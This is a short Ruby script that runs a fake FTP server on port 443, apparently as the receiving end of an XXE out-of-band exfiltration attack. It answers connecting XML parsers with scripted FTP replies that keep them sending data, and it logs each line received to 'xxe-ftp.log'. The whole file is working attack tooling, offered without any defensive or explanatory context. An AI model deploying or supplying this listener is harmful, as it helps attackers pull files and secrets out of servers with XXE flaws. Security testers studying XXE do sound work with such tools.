require 'socket'

ftp_server = TCPServer.new 443

log = File.open( "xxe-ftp.log", "a")

Thread.start do
loop do
  Thread.start(ftp_server.accept) do |ftp_client|
    puts "FTP. New client connected"
    ftp_client.puts("220 xxe-ftp-server")
    loop {
        req = ftp_client.gets()
        break if req.nil?
        puts "< "+req
        log.write "get req: #{req.inspect}\n"
        
        if req.include? "LIST"
            ftp_client.puts("drwxrwxrwx 1 owner group          1 Feb 21 04:37 test")
            ftp_client.puts("150 Opening BINARY mode data connection for /bin/ls")
            ftp_client.puts("226 Transfer complete.")
        elsif req.include? "USER"
            ftp_client.puts("331 password please - version check")
        elsif req.include? "PORT"
            puts "! PORT received"
            puts "> 200 PORT command ok"
            ftp_client.puts("200 PORT command ok")
        else
            puts "> 230 more data please!"
            ftp_client.puts("230 more data please!")
        end
    }
    puts "FTP. Connection closed" 
  end
end
end

loop do
    sleep(10000)
end